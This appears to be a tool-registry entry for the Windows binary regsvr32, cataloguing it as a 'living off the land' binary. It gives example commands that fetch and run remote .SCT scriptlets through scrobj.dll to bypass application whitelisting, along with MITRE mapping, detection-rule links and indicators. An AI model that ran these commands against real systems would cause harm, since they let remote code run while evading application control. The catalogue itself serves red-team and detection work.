---
id: windows-execution-regsvr32
namespace: windows:execution:regsvr32
name: regsvr32
description: 'Used by Windows to register dlls Located at: C:\Windows\System32\regsvr32.exe;
  C:\Windows\SysWOW64\regsvr32.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.defense-evasion.bypass
- security.execution.command
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- regsvr32
parameters: []
features:
- pipes-stdin
- pipes-stdout
- stealth
execution:
  template: regsvr32
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Execute the specified remote .SCT script with scrobj.dll. (Execute
    code from remote scriptlet, bypass Application whitelisting)
  command: regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
- description: Execute the specified local .SCT script with scrobj.dll. (Execute code
    from scriptlet, bypass Application whitelisting)
  command: regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
- description: Execute the specified remote .SCT script with scrobj.dll. (Execute
    code from remote scriptlet, bypass Application whitelisting)
  command: regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
- description: Execute the specified local .SCT script with scrobj.dll. (Execute code
    from scriptlet, bypass Application whitelisting)
  command: regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
- description: Execute code in a DLL. The code must be inside the exported function
    `DllRegisterServer`. (Execute DLL file)
  command: regsvr32.exe /s {PATH:.dll}
- description: Execute code in a DLL. The code must be inside the exported function
    `DllUnRegisterServer`. (Execute DLL file)
  command: regsvr32.exe /u /s {PATH:.dll}
references:
- label: ''
  url: https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/
- label: ''
  url: https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/
- label: T1218.010.md
  url: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.md
techniques:
- defense-evasion
- execution
mitre_ids:
- T1218.010
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_child_process.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_1.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/dns_query/dns_query_win_regsvr32_network_activity.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regsvr32_flags_anomaly.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_net_cli_artefact.yml
- type: splunk
  url: https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_regsvr32_application_control_bypass.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml
- type: ioc
  description: regsvr32.exe retrieving files from Internet
- type: ioc
  description: regsvr32.exe executing scriptlet (sct) files
- type: ioc
  description: DotNet CLR libraries loaded into regsvr32.exe
- type: ioc
  description: DotNet CLR Usage Log - regsvr32.exe.log
install:
- method: choco
  package_name: regsvr32
  commands:
  - choco install regsvr32
---

# regsvr32

regsvr32 is a Windows LOLBin. Used by Windows to register dlls Located at: C:\Windows\System32\regsvr32.exe; C:\Windows\SysWOW64\regsvr32.exe.
